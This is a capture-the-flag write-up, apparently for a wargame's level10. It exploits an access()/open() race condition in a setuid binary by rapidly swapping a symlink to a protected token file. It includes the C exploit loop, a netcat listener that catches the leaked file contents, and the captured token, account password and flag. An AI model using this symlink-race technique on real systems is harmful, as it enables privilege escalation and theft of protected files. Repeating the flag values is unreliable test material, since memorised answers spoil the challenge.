# on our home, we have the same setup as level 08
# Lets do the same routine, exec the binary

./level10 file host

# It say that the binary will send the content of the file to host if you have the appropriate right 
# Let's try with token

./level10 ./token 10.11.200.200
>>> You don't have access to ./token

# I try to ltrace the binary (it's not protected hurray !!! ) and i see that it make a call to access 

#while reading the access man, I saw that you can exploit it by using a method called "Race condition" when we use this function to protect an open call (as here)

#A race condition consist to give a symbolic link to the binary and then switch his target really fast.
#Once in a while the symbolic link will target a custom empty file with all permission required during the access() call and target the token file for the open() call

#Let's make a little exploit :

void main()
{
	int i = 10000;
	while(i)
	{
		system("ln -s /tmp/azur/test /tmp/azur/coucou"); // /tmp/azur/test is an empty file with access rights
		system("rm -rf /tmp/azur/coucou");
		system("ln -s ~/token /tmp/azur/coucou");
		system("rm -rf /tmp/azur/coucou");
	}
}

# Compile and then open 2 shell, one for the netcat listener :

nc -k -l 6969

# And the other one to execute the binary over and over

while true; do ./level10 /tmp/azur/coucou 10.11.200.200; done;

# We are all set up, let's run our exploit

/tmp/azur/a.out

# On the listener side we sometimes get : 

.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.

# our token appears !!

su flag10
woupa2yuojeeaaed06riuj63c

getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c